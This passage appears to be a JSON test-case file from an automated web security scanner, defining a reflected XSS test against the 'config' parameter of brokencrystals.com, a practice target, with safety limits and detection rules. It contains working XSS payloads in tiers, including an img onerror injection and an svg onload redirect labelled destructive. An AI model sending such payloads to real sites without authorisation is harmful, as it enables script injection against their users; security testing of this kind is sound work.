{
  "test_cases": [
    {
      "id": "TC-H1-GET-/-config-xss",
      "hypothesis_id": "H1-GET-/-query-config-xss",
      "base_url": "https://brokencrystals.com",
      "method": "GET",
      "endpoint": "/",
      "parameter": "config",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "query",
              "value": "test"
            }
          ],
          "description": "Baseline benign value"
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "<script>/*probe*/</script>"
            }
          ],
          "description": "Probe XSS payload with harmless script tag for reflection detection",
          "content_type": "text/html"
        },
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "query",
              "value": "\"><img src=x onerror=console.log(1)>"
            }
          ],
          "description": "More aggressive payload to trigger reflection in attribute context",
          "content_type": "text/html"
        },
        {
          "tier": "destructive",
          "payloads": [
            {
              "location": "query",
              "value": "\"><svg onload=location.href='about:blank'>"
            }
          ],
          "description": "Destructive payload (not to be run without explicit permission)",
          "content_type": "text/html"
        }
      ],
      "prerequisites": [
        {
          "type": "session_state",
          "description": "Valid authenticated session cookie may be required"
        }
      ],
      "oracle_rules": [
        {
          "signal": "reflected_input",
          "condition": "payload_value in response.body",
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "abs(len(response.body)-len(baseline.body))/max(1,len(baseline.body)) > 0.20",
          "threshold": {
            "body_length_delta_pct": 20.0
          },
          "weight": 0.6
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 50
      },
      "max_retries": 2,
      "delay_between_requests": 1.0,
      "notes": "Start with benign baseline. Throttle requests to avoid rate limits.",
      "tags": [
        "xss",
        "reflected",
        "query"
      ],
      "estimated_duration": 60
    },
